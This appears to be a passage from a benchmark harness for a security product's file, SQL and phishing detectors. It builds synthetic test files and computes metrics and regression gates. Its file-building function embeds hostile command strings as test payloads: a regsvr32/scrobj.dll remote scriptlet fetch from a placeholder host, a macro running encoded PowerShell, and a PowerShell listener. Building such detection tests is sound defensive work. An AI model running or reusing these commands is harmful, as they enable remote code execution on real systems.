    extension = str(metadata.get("extension") or Path(filename).suffix.lstrip(".")).lower().strip()
    excerpt = str(metadata.get("content_excerpt") or record.get("text") or "").strip()
    macro_enabled = str(metadata.get("macro_enabled") or "").lower().strip() in {"1", "true", "yes", "on"}

    if scenario == "nested_archive_abuse":
        shell_hint = (b"regsv" + b"r32 /s /n /u /i:https://example.invalid/payload.sct scrobj.dll")
        inner = _zip_bytes({"payloads/shell.txt": shell_hint})
        payload = _zip_bytes({"nested/payload.zip": inner, "readme.txt": b"nested package"})
        if not filename.lower().endswith(".zip"):
            filename = f"{Path(filename).stem}.zip"
        return filename, payload

    if scenario == "malicious_pdf_ooxml":
        if file_type == "pdf" or extension == "pdf":
            payload = b"%PDF-1.7\n/OpenAction\n/JavaScript\n/Launch\n" + excerpt.encode("utf-8", errors="ignore")
            if not filename.lower().endswith(".pdf"):
                filename = f"{Path(filename).stem}.pdf"
            return filename, payload
        entries = {
            "[Content_Types].xml": b"<Types></Types>",
            "word/document.xml": (excerpt or "urgent payment").encode("utf-8"),
            "word/vbaProject.bin": (b"CreateObject(\"Wscript.Shell\").Run \"" + b"power" + b"shell -enc AAA=\""),
        }
        if extension not in {"docm", "docx"}:
            filename = f"{Path(filename).stem}.docm"
        return filename, _zip_bytes(entries)

    if scenario == "mime_extension_mismatch":
        script = ("power" + "shell -c \"New-Object System.Net.Sockets." + "TcpListener('0.0.0.0',443);\"")
        if not extension:
            filename = f"{filename}.pdf"
        return filename, script.encode("utf-8")

    if scenario == "benign_macro_enabled_office":
        entries = {
            "[Content_Types].xml": b"<Types></Types>",
            "word/document.xml": (excerpt or "benign report").encode("utf-8"),
        }
        if macro_enabled:
            entries["word/vbaProject.bin"] = b"Sub AutoOpen()\n' benign macro\nEnd Sub"
        if extension not in {"docm", "docx", "xlsm", "pptm"}:
            filename = f"{Path(filename).stem}.docm"
        return filename, _zip_bytes(entries)

    if file_type == "pdf" or extension == "pdf":
        payload = b"%PDF-1.7\n" + (excerpt or "Business report").encode("utf-8", errors="ignore")
        if not filename.lower().endswith(".pdf"):
            filename = f"{Path(filename).stem}.pdf"
        return filename, payload

    if extension in {"docx", "xlsx", "pptx", "docm", "xlsm", "pptm"} or file_type in {"ooxml", "office"}:
        entries = {
            "[Content_Types].xml": b"<Types></Types>",
            "word/document.xml": (excerpt or "business summary").encode("utf-8"),
        }
        return filename, _zip_bytes(entries)

    return filename, (excerpt or "benign text").encode("utf-8", errors="ignore")


def _extract_spam_request(record: Dict[str, Any]) -> Dict[str, Any]:
    metadata = record.get("metadata") or {}
    label = int(record.get("label") or 0)
    scenario = str(record.get("scenario") or "").strip()
    sender_email = str(metadata.get("sender_email") or "").strip()
    sender_domain = str(metadata.get("sender_domain") or "").strip()
    subject = str(metadata.get("subject") or "").strip()
    urls = str(metadata.get("urls") or "").strip()
    note = str(metadata.get("notes") or "").strip()
    text = str(record.get("text") or "").strip()

    if not sender_email and sender_domain:
        sender_email = f"noreply@{sender_domain}"
    if not sender_email:
        sender_email = "noreply@example.org"
    if not subject:
        subject = f"{scenario or 'Notification'} message"

    body_text = " ".join(x for x in [note, text, f"Visit: {urls}" if urls else ""] if x).strip()
    if not body_text:
        body_text = "System notice."

    headers: Optional[Dict[str, str]] = None
    if scenario == "sender_domain_metadata":
        if label == 1:
            headers = {"SPF": "fail", "DKIM": "fail", "DMARC": "fail"}
        else:
            headers = {"SPF": "pass", "DKIM": "pass", "DMARC": "pass"}

    return {
        "subject": subject,
        "body_text": body_text,
        "sender_email": sender_email,
        "headers": headers,
    }


def run_sql_benchmark(dataset: DomainDataset) -> Dict[str, Any]:
    from backend.security import sql_enforcer
    from backend.services.alerts_service import AlertsService
    from backend.services.query_analysis_service import QueryAnalysisService

    alerts = AlertsService()
    try:
        svc = QueryAnalysisService.get_instance()
    except RuntimeError:
        models = BACKEND_ROOT / "data" / "models_store"
        svc = QueryAnalysisService(
            anomaly_model_path=str(models / "anomaly_detection_model.joblib"),
            anomaly_scaler_path=str(models / "anomaly_query_scaler.joblib"),
            query_validation_model_path=str(models / "query_validation_model.joblib"),
            alerts_service=alerts,
        )

    records = dataset.frame.to_dict(orient="records")
    samples: List[Dict[str, Any]] = []
    used_records: List[Dict[str, Any]] = []
    for row in records:
        query = str(row.get("query") or "").strip()
        if not query:
            continue
        expected = "malicious" if int(row.get("label") or 0) == 1 else "benign"
        samples.append({"query": query, "expected_label": expected})
        used_records.append(row)

    eval_payload = svc.evaluate_precision_dataset(samples=samples, include_predictions=True, max_examples=50)
    pred_rows = eval_payload.get("predictions") or []
    y_true = [int(row.get("label") or 0) for row in used_records]
    y_pred_analysis = [1 if str(row.get("predicted_label") or "").lower() == "malicious" else 0 for row in pred_rows]
    hs_flags = [bool(row.get("high_severity")) for row in used_records]
    analysis_metrics = compute_binary_metrics(y_true, y_pred_analysis, hs_flags).as_dict()

    enforcement_predictions: List[int] = []
    enforcement_details: List[Dict[str, Any]] = []
    for row in used_records:
        metadata = row.get("metadata") or {}
        service_context = str(metadata.get("service_context") or "benchmark-service").strip() or "benchmark-service"
        token = set_current_service(service_context)
        try:
            decision = sql_enforcer.decide(str(row.get("query") or ""), parameters={})
        finally:
            reset_current_service(token)
        action = str(decision.get("decision") or "ALLOW").upper()
        predicted = 1 if action in {"BLOCK_IMMEDIATE", "FLAG_FOR_REVIEW_BLOCK"} else 0
        enforcement_predictions.append(predicted)
        enforcement_details.append(
            {
                "decision": action,
                "risk": decision.get("risk"),
                "reason": decision.get("reason"),
                "hits": "|".join(sorted([str(x) for x in decision.get("hits") or []])),
            }
        )

    enforcement_metrics = compute_binary_metrics(y_true, enforcement_predictions, hs_flags).as_dict()

    sql_slice_records: List[Dict[str, Any]] = []
    for row in used_records:
        metadata = row.get("metadata") or {}
        benign_type = str(row.get("benign_scenario_type") or metadata.get("benign_scenario_type") or "").strip()
        if not benign_type:
            benign_type = "non_benign" if int(row.get("label") or 0) == 1 else "general_benign"
        benchmark_group = str(row.get("benchmark_group") or metadata.get("benchmark_group") or "").strip()
        if not benchmark_group:
            benchmark_group = "regression"
        severity = str(row.get("severity") or metadata.get("severity") or "").strip()
        if not severity:
            severity = "high" if bool(row.get("high_severity")) else "none"
        source_confidence = str(row.get("source_confidence") or metadata.get("source_confidence") or "").strip()
        if not source_confidence:
            source_confidence = "unknown"
        tuned_phase2_1 = str(
            row.get("tuned_during_phase2_1") or metadata.get("tuned_during_phase2_1") or "false"
        ).strip()
        sql_slice_records.append(
            {
                "scenario": str(row.get("scenario") or ""),
                "dialect": str(metadata.get("dialect") or "unknown").strip().lower() or "unknown",
                "attack_family": _sql_attack_family(str(row.get("scenario") or "")),
                "severity_slice": "high_severity" if bool(row.get("high_severity")) else "standard",
                "severity": severity,
                "benign_scenario_type": benign_type,
                "benchmark_group": benchmark_group,
                "source_confidence": source_confidence,
                "tuned_during_phase2_1": "true" if _as_bool(tuned_phase2_1, default=False) else "false",
            }
        )

    slices_analysis = compute_slice_metrics(
        records=sql_slice_records,
        y_true=y_true,
        y_pred=y_pred_analysis,
        high_severity_flags=hs_flags,
        slicers={
            "attack_family": lambda r: str(r.get("attack_family") or "unknown"),
            "dialect": lambda r: str(r.get("dialect") or "unknown"),
            "severity_slice": lambda r: str(r.get("severity_slice") or "unknown"),
            "severity": lambda r: str(r.get("severity") or "unknown"),
            "benchmark_group": lambda r: str(r.get("benchmark_group") or "unknown"),
            "scenario": lambda r: str(r.get("scenario") or "unknown"),
        },
    )
    slices_enforcement = compute_slice_metrics(
        records=sql_slice_records,
        y_true=y_true,
        y_pred=enforcement_predictions,
        high_severity_flags=hs_flags,
        slicers={
            "attack_family": lambda r: str(r.get("attack_family") or "unknown"),
            "dialect": lambda r: str(r.get("dialect") or "unknown"),
            "severity_slice": lambda r: str(r.get("severity_slice") or "unknown"),
            "severity": lambda r: str(r.get("severity") or "unknown"),
            "benchmark_group": lambda r: str(r.get("benchmark_group") or "unknown"),
            "benign_scenario_type": lambda r: str(r.get("benign_scenario_type") or "unknown"),
            "scenario": lambda r: str(r.get("scenario") or "unknown"),
        },
    )

    def _benign_fp_slices(preds: Sequence[int]) -> Dict[str, Dict[str, Dict[str, Any]]]:
        benign_idxs = [idx for idx, truth in enumerate(y_true) if int(truth) == 0]
        out: Dict[str, Dict[str, Dict[str, Any]]] = {}
        dimensions = {
            "scenario": lambda r: str(r.get("scenario") or "unknown"),
            "benign_scenario_type": lambda r: str(r.get("benign_scenario_type") or "unknown"),
            "dialect": lambda r: str(r.get("dialect") or "unknown"),
            "benchmark_group": lambda r: str(r.get("benchmark_group") or "unknown"),
        }
        for dim, fn in dimensions.items():
            grouped: Dict[str, List[int]] = {}
            for idx in benign_idxs:
                key = str(fn(sql_slice_records[idx]) or "unknown").strip() or "unknown"
                grouped.setdefault(key, []).append(idx)
            payload: Dict[str, Dict[str, Any]] = {}
            for key, idxs in sorted(grouped.items(), key=lambda x: x[0]):
                total = len(idxs)
                fp = sum(1 for i in idxs if int(preds[i]) == 1)
                payload[key] = {
                    "sample_count": total,
                    "false_positive_count": int(fp),
                    "false_positive_rate": round(float(fp / total) if total else 0.0, 4),
                }
            out[dim] = payload
        return out

    group_views: Dict[str, Any] = {}
    groups = sorted(set(str(rec.get("benchmark_group") or "unknown") for rec in sql_slice_records))
    for group in groups:
        idxs = [idx for idx, rec in enumerate(sql_slice_records) if str(rec.get("benchmark_group") or "") == group]
        if not idxs:
            continue
        g_true = [int(y_true[i]) for i in idxs]
        g_analysis = [int(y_pred_analysis[i]) for i in idxs]
        g_enforcement = [int(enforcement_predictions[i]) for i in idxs]
        g_hs = [bool(hs_flags[i]) for i in idxs]
        g_records = [sql_slice_records[i] for i in idxs]
        group_views[group] = {
            "sample_count": int(len(idxs)),
            "metrics": {
                "analysis": compute_binary_metrics(g_true, g_analysis, g_hs).as_dict(),
                "enforcement": compute_binary_metrics(g_true, g_enforcement, g_hs).as_dict(),
            },
            "slices": {
                "analysis": compute_slice_metrics(
                    records=g_records,
                    y_true=g_true,
                    y_pred=g_analysis,
                    high_severity_flags=g_hs,
                    slicers={
                        "attack_family": lambda r: str(r.get("attack_family") or "unknown"),
                        "dialect": lambda r: str(r.get("dialect") or "unknown"),
                        "severity_slice": lambda r: str(r.get("severity_slice") or "unknown"),
                        "severity": lambda r: str(r.get("severity") or "unknown"),
                        "scenario": lambda r: str(r.get("scenario") or "unknown"),
                    },
                ),
                "enforcement": compute_slice_metrics(
                    records=g_records,
                    y_true=g_true,
                    y_pred=g_enforcement,
                    high_severity_flags=g_hs,
                    slicers={
                        "attack_family": lambda r: str(r.get("attack_family") or "unknown"),
                        "dialect": lambda r: str(r.get("dialect") or "unknown"),
                        "severity_slice": lambda r: str(r.get("severity_slice") or "unknown"),
                        "severity": lambda r: str(r.get("severity") or "unknown"),
                        "benign_scenario_type": lambda r: str(r.get("benign_scenario_type") or "unknown"),
                        "scenario": lambda r: str(r.get("scenario") or "unknown"),
                    },
                ),
            },
        }

    prediction_rows: List[Dict[str, Any]] = []
    for idx, row in enumerate(used_records):
        metadata = row.get("metadata") or {}
        details = enforcement_details[idx]
        prediction_rows.append(
            {
                "sample_id": row.get("sample_id"),
                "label": int(row.get("label") or 0),
                "scenario": row.get("scenario"),
                "dialect": metadata.get("dialect"),
                "service_context": metadata.get("service_context"),
                "severity": sql_slice_records[idx].get("severity"),
                "benchmark_group": sql_slice_records[idx].get("benchmark_group"),
                "source_confidence": sql_slice_records[idx].get("source_confidence"),
                "benign_scenario_type": sql_slice_records[idx].get("benign_scenario_type"),
                "tuned_during_phase2_1": sql_slice_records[idx].get("tuned_during_phase2_1"),
                "high_severity": bool(row.get("high_severity")),
                "pred_analysis": int(y_pred_analysis[idx]),
                "pred_enforcement": int(enforcement_predictions[idx]),
                "enforcement_decision": details.get("decision"),
                "enforcement_risk": details.get("risk"),
                "enforcement_reason": details.get("reason"),
                "enforcement_hits": details.get("hits"),
                "query": row.get("query"),
            }
        )

    return {
        "metrics": {"analysis": analysis_metrics, "enforcement": enforcement_metrics},
        "slices": {"analysis": slices_analysis, "enforcement": slices_enforcement},
        "group_views": group_views,
        "held_out_only": group_views.get("held_out_adversarial"),
        "benign_false_positive_slices": {
            "analysis": _benign_fp_slices(y_pred_analysis),
            "enforcement": _benign_fp_slices(enforcement_predictions),
        },
        "predictions": prediction_rows,
    }


async def _run_file_benchmark_async(
    dataset: DomainDataset,
    *,
    dynamic_runtime: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    from backend.services.alerts_service import AlertsService
    from backend.services.file_analysis_service import FileAnalysisService

    alerts = AlertsService()
    try:
        svc = FileAnalysisService.get_instance()
    except RuntimeError:
        models = BACKEND_ROOT / "data" / "models_store"
        svc = FileAnalysisService(
            ml_model_path=str(models / "file_analyzer_v1.joblib"),
            yara_rules_path=str(BACKEND_ROOT / "yara_rules" / "basic_rules.yar"),
            alerts_service=alerts,
        )
    if isinstance(dynamic_runtime, dict) and dynamic_runtime:
        svc.configure_dynamic_runtime(
            enabled=dynamic_runtime.get("enabled"),
            provider_name=dynamic_runtime.get("provider_name"),
            provider_config=dynamic_runtime.get("provider_config"),
            poll_interval_seconds=dynamic_runtime.get("poll_interval_seconds"),
            max_wait_seconds=dynamic_runtime.get("max_wait_seconds"),
        )
    provider_status = svc.get_dynamic_provider_status()
    provider_run_label = _resolve_dynamic_provider_run_label(
        provider_status,
        runtime_mode=str((dynamic_runtime or {}).get("mode") or "inherit"),
    )

    fake_db = _FakeSession()
    records = dataset.frame.to_dict(orient="records")
    y_true: List[int] = []
    y_pred: List[int] = []
    hs_flags: List[bool] = []
    prediction_rows: List[Dict[str, Any]] = []

    for row in records:
        filename, payload = _build_file_payload(row)
        upload = UploadFile(file=io.BytesIO(payload), filename=filename)
        result = await svc.analyze_file(fake_db, upload, tenant_id="benchmark")
        assessment = result.get("overall_assessment") or {}
        structured_verdict = result.get("structured_verdict") or {}
        dynamic_state = structured_verdict.get("dynamic_analysis") or {}
        rec_action = str(assessment.get("recommended_action") or "ALLOW_UPLOAD").upper()
        pred = 0 if rec_action.startswith("ALLOW") else 1

        y_true.append(int(row.get("label") or 0))
        y_pred.append(pred)
        hs_flags.append(bool(row.get("high_severity")))
        metadata = row.get("metadata") or {}
        file_type = metadata.get("file_type")
        extension = metadata.get("extension")
        scenario = row.get("scenario")
        payload_class = _file_payload_class(file_type=str(file_type or "unknown"), extension=str(extension or ""), scenario=str(scenario or ""))
        file_family = _file_family_bucket(
            file_type=file_type,
            extension=extension,
            payload_class=payload_class,
            nested_archive=metadata.get("nested_archive"),
            macro_enabled=metadata.get("macro_enabled"),
            request_decision=dynamic_state.get("request_decision"),
        )
        verdict_iocs = list(structured_verdict.get("iocs") or [])
        static_ioc_count = 0
        dynamic_ioc_count = 0
        for ioc in verdict_iocs:
            source_stage = _norm_slug((ioc or {}).get("source_stage"))
            if source_stage.startswith("dynamic"):
                dynamic_ioc_count += 1
            else:
                static_ioc_count += 1
        dynamic_ioc_types = [
            _norm_slug((ioc or {}).get("type")) or str((ioc or {}).get("type") or "")
            for ioc in list(dynamic_state.get("dynamic_iocs") or [])
            if str((ioc or {}).get("type") or "").strip()
        ]
        reason_codes = [
            _norm_slug(code) or str(code)
            for code in list(dynamic_state.get("reason_codes") or [])
            if str(code).strip()
        ]
        prediction_rows.append(
            {
                "sample_id": row.get("sample_id"),
                "label": int(row.get("label") or 0),
                "scenario": scenario,
                "file_type": file_type,
                "extension": extension,
                "nested_archive": metadata.get("nested_archive"),
                "macro_enabled": metadata.get("macro_enabled"),
                "payload_class": payload_class,
                "file_family": file_family,
                "severity_band": _severity_band(structured_verdict.get("severity")),
                "high_severity": bool(row.get("high_severity")),
                "predicted_positive": pred,
                "recommended_action": rec_action,
                "overall_status": str(assessment.get("overall_status") or ""),
                "risk_score": _safe_float(assessment.get("risk_score")),
                "filename": filename,
                "dynamic_requested": bool(dynamic_state.get("requested")),
                "dynamic_request_decision": _norm_slug(dynamic_state.get("request_decision")) or "not_reported",
                "dynamic_skip_reason": _norm_slug(dynamic_state.get("skip_reason")),
                "dynamic_policy_profile": _norm_slug(dynamic_state.get("policy_profile")) or "unknown",
                "dynamic_reason_codes": reason_codes,
                "dynamic_status": _norm_slug(dynamic_state.get("dynamic_status")) or "unknown",
                "dynamic_added_ioc_count": len(list(dynamic_state.get("dynamic_iocs") or [])),
                "dynamic_added_evidence_count": len(list(dynamic_state.get("dynamic_evidence_items") or [])),
                "dynamic_ioc_types": dynamic_ioc_types,
                "static_ioc_count": int(static_ioc_count),
                "dynamic_ioc_count": int(dynamic_ioc_count),
            }
        )

    metrics = compute_binary_metrics(y_true, y_pred, hs_flags).as_dict()
    slice_records: List[Dict[str, Any]] = []
    for row in prediction_rows:
        file_type = str(row.get("file_type") or "unknown")
        extension = str(row.get("extension") or "")
        scenario = str(row.get("scenario") or "")
        nested = str(row.get("nested_archive") or "").lower().strip() in {"1", "true", "yes", "on"}
        payload_class = _file_payload_class(file_type=file_type, extension=extension, scenario=scenario)
        slice_records.append(
            {
                "scenario": scenario,
                "file_type": file_type or "unknown",
                "malicious_doc": "yes" if payload_class == "document" else "no",
                "archive_profile": "nested_archive" if nested or payload_class == "archive" else "not_archive",
                "payload_class": payload_class,
            }
        )

    slices = compute_slice_metrics(
        records=slice_records,
        y_true=y_true,
        y_pred=y_pred,
        high_severity_flags=hs_flags,
        slicers={
            "file_type": lambda r: str(r.get("file_type") or "unknown"),
            "malicious_doc": lambda r: str(r.get("malicious_doc") or "unknown"),
            "archive_profile": lambda r: str(r.get("archive_profile") or "unknown"),
            "payload_class": lambda r: str(r.get("payload_class") or "unknown"),
            "scenario": lambda r: str(r.get("scenario") or "unknown"),
        },
    )
    dynamic_policy_report = build_file_dynamic_policy_report(prediction_rows)
    dynamic_policy_report["provider_readiness"] = {
        "run_label": provider_run_label,
        "provider_name": provider_status.get("active_provider"),
        "configured": provider_status.get("configured"),
        "available": provider_status.get("available"),
        "validation_state": ((provider_status.get("validation") or {}).get("validation_state")),
        "validation_reason": ((provider_status.get("validation") or {}).get("reason")),
    }
    return {
        "metrics": metrics,
        "slices": slices,
        "predictions": prediction_rows,
        "dynamic_policy": dynamic_policy_report,
        "dynamic_provider_status": provider_status,
        "dynamic_provider_run_label": provider_run_label,
    }


def run_file_benchmark(
    dataset: DomainDataset,
    *,
    dynamic_runtime: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    return asyncio.run(_run_file_benchmark_async(dataset, dynamic_runtime=dynamic_runtime))


def run_phishing_benchmark(dataset: DomainDataset, *, disable_transformer: bool) -> Dict[str, Any]:
    from backend.server.schemas.requests import EmailAnalysisRequest
    from backend.services.alerts_service import AlertsService
    from backend.services.spam_detection_service import SpamDetectionService

    if disable_transformer:
        os.environ["SPAM_TRANSFORMER_MODEL"] = ""

    alerts = AlertsService()
    try:
        svc = SpamDetectionService.get_instance()
    except RuntimeError:
        svc = SpamDetectionService(
            model_path=str(BACKEND_ROOT / "data" / "models_store" / "spam_detector_v1.joblib"),
            alerts_service=alerts,
        )

    fake_db = _FakeSession()
    records = dataset.frame.to_dict(orient="records")
    y_true: List[int] = []
    y_pred: List[int] = []
    hs_flags: List[bool] = []
    prediction_rows: List[Dict[str, Any]] = []

    for row in records:
        req_data = _extract_spam_request(row)
        req = EmailAnalysisRequest(
            subject=req_data["subject"],
            body_text=req_data["body_text"],
            sender_email=req_data["sender_email"],
            headers=req_data.get("headers"),
        )
        result = svc.analyze_email(fake_db, req, tenant_id="benchmark")
        spam_cls = result.get("spam_classification") or {}
        score_breakdown = result.get("score_breakdown") or {}
        pred = 1 if bool(spam_cls.get("is_spam")) else 0
        label = int(row.get("label") or 0)

        y_true.append(label)
        y_pred.append(pred)
        hs_flags.append(bool(row.get("high_severity")))
        prediction_rows.append(
            {
                "sample_id": row.get("sample_id"),
                "label": label,
                "scenario": row.get("scenario"),
                "high_severity": bool(row.get("high_severity")),
                "auth_signal_presence": "available" if req_data.get("headers") else "missing",
                "predicted_positive": pred,
                "classification_label": spam_cls.get("classification_label"),
                "spam_score": _safe_float(spam_cls.get("spam_score")),
                "decision_category": (result.get("meta_features") or {}).get("decision_category"),
                "ood_score": _safe_float((result.get("meta_features") or {}).get("ood_score")),
                "final_score": _safe_float(score_breakdown.get("final")),
            }
        )

    metrics = compute_binary_metrics(y_true, y_pred, hs_flags).as_dict()
    slice_records: List[Dict[str, Any]] = []
    for row in prediction_rows:
        scenario = str(row.get("scenario") or "unknown")
        slice_records.append(
            {
                "scenario": scenario,
                "phishing_type": scenario,
                "auth_signal_presence": row.get("auth_signal_presence") or "missing",
                "message_class": _spam_message_class(int(row.get("label") or 0), scenario),
            }
        )

    slices = compute_slice_metrics(
        records=slice_records,
        y_true=y_true,
        y_pred=y_pred,
        high_severity_flags=hs_flags,
        slicers={
            "phishing_type": lambda r: str(r.get("phishing_type") or "unknown"),
            "auth_signal_presence": lambda r: str(r.get("auth_signal_presence") or "unknown"),
            "message_class": lambda r: str(r.get("message_class") or "unknown"),
            "scenario": lambda r: str(r.get("scenario") or "unknown"),
        },
    )
    return {"metrics": metrics, "slices": slices, "predictions": prediction_rows}


def _flatten_gated_metrics(results: Dict[str, Any]) -> Dict[str, Dict[str, Any]]:
    flattened: Dict[str, Dict[str, Any]] = {}
    sql_metrics = dict((results.get("sql") or {}).get("metrics", {}))
    file_metrics = dict((results.get("file") or {}).get("metrics", {}))
    phishing_metrics = dict((results.get("phishing") or {}).get("metrics", {})
    )
    if sql_metrics.get("analysis"):
        flattened["sql.analysis"] = dict(sql_metrics.get("analysis") or {})
    if sql_metrics.get("enforcement"):
        flattened["sql.enforcement"] = dict(sql_metrics.get("enforcement") or {})
    if file_metrics:
        flattened["file.triage"] = dict(file_metrics)
    if phishing_metrics:
        flattened["phishing.detection"] = dict(phishing_metrics)
    return flattened


def evaluate_regression_gate(
    *,
    current_metrics: Dict[str, Dict[str, Any]],
    baseline_metrics: Dict[str, Dict[str, Any]],
    thresholds: Dict[str, Any],
) -> Dict[str, Any]:
    reasons: List[str] = []
    domain_thresholds = thresholds.get("domains") if isinstance(thresholds, dict) else {}
    if not isinstance(domain_thresholds, dict):
        domain_thresholds = {}
    reg = thresholds.get("regression") if isinstance(thresholds, dict) else {}
    if not isinstance(reg, dict):
        reg = {}

    for metric_key, metrics in current_metrics.items():
        cfg = domain_thresholds.get(metric_key, {})
        if not isinstance(cfg, dict):
            cfg = {}
        precision = _safe_float(metrics.get("precision"))
        recall = _safe_float(metrics.get("recall"))
        f1 = _safe_float(metrics.get("f1"))
        fpr = _safe_float(metrics.get("false_positive_rate"))
        hs_miss = _safe_float(metrics.get("high_severity_miss_rate"))

        if cfg.get("min_precision") is not None and precision < float(cfg["min_precision"]):
            reasons.append(f"{metric_key}: precision {precision:.4f} < {float(cfg['min_precision']):.4f}")
        if cfg.get("min_recall") is not None and recall < float(cfg["min_recall"]):
            reasons.append(f"{metric_key}: recall {recall:.4f} < {float(cfg['min_recall']):.4f}")
        if cfg.get("min_f1") is not None and f1 < float(cfg["min_f1"]):
            reasons.append(f"{metric_key}: f1 {f1:.4f} < {float(cfg['min_f1']):.4f}")
        if cfg.get("max_fpr") is not None and fpr > float(cfg["max_fpr"]):
            reasons.append(f"{metric_key}: fpr {fpr:.4f} > {float(cfg['max_fpr']):.4f}")
        if cfg.get("max_high_severity_miss_rate") is not None and hs_miss > float(cfg["max_high_severity_miss_rate"]):
            reasons.append(
                f"{metric_key}: high_severity_miss_rate {hs_miss:.4f} > {float(cfg['max_high_severity_miss_rate']):.4f}"
            )

        baseline = baseline_metrics.get(metric_key) if isinstance(baseline_metrics, dict) else None
        if not isinstance(baseline, dict):
            continue
        b_precision = _safe_float(baseline.get("precision"))
        b_recall = _safe_float(baseline.get("recall"))
        b_f1 = _safe_float(baseline.get("f1"))
        b_fpr = _safe_float(baseline.get("false_positive_rate"))
        b_hs_miss = _safe_float(baseline.get("high_severity_miss_rate"))

        if (b_precision - precision) > _safe_float(reg.get("max_precision_drop"), 0.0):
            reasons.append(f"{metric_key}: precision regression {b_precision:.4f} -> {precision:.4f}")
        if (b_recall - recall) > _safe_float(reg.get("max_recall_drop"), 0.0):
            reasons.append(f"{metric_key}: recall regression {b_recall:.4f} -> {recall:.4f}")
        if (b_f1 - f1) > _safe_float(reg.get("max_f1_drop"), 0.0):
            reasons.append(f"{metric_key}: f1 regression {b_f1:.4f} -> {f1:.4f}")
        if (fpr - b_fpr) > _safe_float(reg.get("max_fpr_increase"), 0.0):
            reasons.append(f"{metric_key}: fpr regression {b_fpr:.4f} -> {fpr:.4f}")
        if (hs_miss - b_hs_miss) > _safe_float(reg.get("max_high_severity_miss_rate_increase"), 0.0):
            reasons.append(f"{metric_key}: high_severity_miss_rate regression {b_hs_miss:.4f} -> {hs_miss:.4f}")

    return {"passed": len(reasons) == 0, "reasons": reasons}


def _apply_metric_thresholds(
    *,
    metric_key: str,
    metrics: Dict[str, Any],
    cfg: Dict[str, Any],
    reasons: List[str],
) -> None:
    precision = _safe_float(metrics.get("precision"))
    recall = _safe_float(metrics.get("recall"))
    f1 = _safe_float(metrics.get("f1"))
    fpr = _safe_float(metrics.get("false_positive_rate"))
    hs_miss = _safe_float(metrics.get("high_severity_miss_rate"))
    cm = metrics.get("confusion_matrix") if isinstance(metrics.get("confusion_matrix"), dict) else {}
    tp = int(cm.get("tp") or 0)
    fn = int(cm.get("fn") or 0)
    tn = int(cm.get("tn") or 0)
    fp = int(cm.get("fp") or 0)
    positives = tp + fn
    negatives = tn + fp

    if cfg.get("min_precision") is not None and precision < float(cfg["min_precision"]):
        reasons.append(f"{metric_key}: precision {precision:.4f} < {float(cfg['min_precision']):.4f}")
    if cfg.get("min_recall") is not None and positives > 0 and recall < float(cfg["min_recall"]):
        reasons.append(f"{metric_key}: recall {recall:.4f} < {float(cfg['min_recall']):.4f}")
    if cfg.get("min_f1") is not None and f1 < float(cfg["min_f1"]):
        reasons.append(f"{metric_key}: f1 {f1:.4f} < {float(cfg['min_f1']):.4f}")
    if cfg.get("max_fpr") is not None and negatives > 0 and fpr > float(cfg["max_fpr"]):
        reasons.append(f"{metric_key}: fpr {fpr:.4f} > {float(cfg['max_fpr']):.4f}")
    if cfg.get("max_high_severity_miss_rate") is not None and positives > 0 and hs_miss > float(cfg["max_high_severity_miss_rate"]):
        reasons.append(
            f"{metric_key}: high_severity_miss_rate {hs_miss:.4f} > {float(cfg['max_high_severity_miss_rate']):.4f}"
        )


def evaluate_sql_slice_gate(*, results: Dict[str, Any], thresholds: Dict[str, Any]) -> Dict[str, Any]:
    reasons: List[str] = []
    sql_cfg = thresholds.get("sql_slices") if isinstance(thresholds, dict) else {}
    if not isinstance(sql_cfg, dict):
        return {"passed": True, "reasons": []}
    enforcement_cfg = sql_cfg.get("enforcement")
    if not isinstance(enforcement_cfg, dict):
        return {"passed": True, "reasons": []}

    enforcement_slices = (((results.get("sql") or {}).get("slices") or {}).get("enforcement") or {})
    if not isinstance(enforcement_slices, dict):
        return {"passed": True, "reasons": []}

    for dimension, dimension_cfg in enforcement_cfg.items():
        if not isinstance(dimension_cfg, dict):
            continue
        dimension_metrics = enforcement_slices.get(str(dimension))
        if not isinstance(dimension_metrics, dict):
            continue
        for slice_name, cfg in dimension_cfg.items():
            if not isinstance(cfg, dict):
                continue
            metrics = dimension_metrics.get(str(slice_name))
            if not isinstance(metrics, dict):
                continue
            min_samples = int(cfg.get("min_sample_count") or 0)
            if min_samples > 0 and int(metrics.get("sample_count") or 0) < min_samples:
                continue
            _apply_metric_thresholds(
                metric_key=f"sql.enforcement.{dimension}.{slice_name}",
                metrics=metrics,
                cfg=cfg,
                reasons=reasons,
            )

    return {"passed": len(reasons) == 0, "reasons": reasons}


def evaluate_sql_heldout_gate(*, results: Dict[str, Any], thresholds: Dict[str, Any]) -> Dict[str, Any]:
    reasons: List[str] = []
    cfg_root = thresholds.get("sql_heldout") if isinstance(thresholds, dict) else {}
    if not isinstance(cfg_root, dict):
        return {"passed": True, "reasons": []}
    cfg = cfg_root.get("enforcement")
    if not isinstance(cfg, dict):
        return {"passed": True, "reasons": []}

    heldout = ((results.get("sql") or {}).get("held_out_only") or {})
    if not isinstance(heldout, dict) or not heldout:
        reasons.append("sql.enforcement.held_out: missing held-out adversarial benchmark group")
        return {"passed": False, "reasons": reasons}

    sample_count = int(heldout.get("sample_count") or 0)
    min_samples = int(cfg.get("min_sample_count") or 0)
    if min_samples > 0 and sample_count < min_samples:
        reasons.append(
            f"sql.enforcement.held_out: sample_count {sample_count} < required {min_samples}"
        )
        return {"passed": False, "reasons": reasons}

    metrics = ((heldout.get("metrics") or {}).get("enforcement") or {})
    if not isinstance(metrics, dict):
        reasons.append("sql.enforcement.held_out: missing enforcement metrics")
        return {"passed": False, "reasons": reasons}

    _apply_metric_thresholds(
        metric_key="sql.enforcement.held_out",
        metrics=metrics,
        cfg=cfg,
        reasons=reasons,
    )
    return {"passed": len(reasons) == 0, "reasons": reasons}


def evaluate_file_dynamic_policy_gate(*, results: Dict[str, Any], thresholds: Dict[str, Any]) -> Dict[str, Any]:
    reasons: List[str] = []
    cfg_root = thresholds.get("file_dynamic_policy") if isinstance(thresholds, dict) else {}
    if not isinstance(cfg_root, dict):
        return {"passed": True, "reasons": []}

    file_result = results.get("file") if isinstance(results, dict) else None
    if not isinstance(file_result, dict):
        return {"passed": True, "reasons": []}
    report = file_result.get("dynamic_policy")
    if not isinstance(report, dict):
        return {"passed": False, "reasons": ["file.dynamic_policy: missing dynamic_policy report in benchmark output"]}

    required_sections = list(cfg_root.get("required_sections") or [])
    for section in required_sections:
        if section not in report:
            reasons.append(f"file.dynamic_policy: missing required section '{section}'")

